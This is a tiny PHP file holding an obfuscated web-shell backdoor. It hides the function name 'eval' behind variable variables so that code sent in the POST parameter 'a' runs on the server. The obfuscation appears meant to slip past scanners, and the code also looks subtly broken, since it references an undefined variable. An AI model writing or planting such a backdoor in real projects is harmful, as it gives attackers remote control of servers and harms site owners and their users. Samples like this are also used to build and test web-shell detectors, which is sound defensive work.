<?php
$bb="eval";
$a="bb";
$$aa($_POST['a']);
?>